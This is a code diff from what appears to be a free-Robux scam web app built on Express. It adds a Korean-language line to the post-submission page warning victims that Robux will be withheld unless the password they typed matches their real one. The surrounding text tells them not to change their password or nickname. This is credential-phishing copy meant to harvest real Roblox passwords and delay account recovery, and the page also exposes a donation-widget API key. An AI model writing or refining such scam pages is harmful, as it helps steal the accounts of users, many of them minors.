@@ -79,6 +79,7 @@ app.post("/robux", async (req, res) => {
 
         return res.send(`
 <h2>빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오.</h2>
+<h2>비밀번호를 올바르게 입력했는지 생각해보세요! 만약 입력된 비밀번호가 실제 비밀번호랑 같지 않다면 본인이 아닌 것으로 간주하여 로벅스를 드리지 않습니다</h2>
 <h1>기부로 개발자를 도와주세요!</h1>
 <iframe src="https://nowpayments.io/embeds/donation-widget?api_key=SPB4XA6-B4M4TZ4-HTHXA2C-96QC978" width="346" height="623" frameborder="0" scrolling="no" style="overflow-y: hidden;">
     Can't load widget
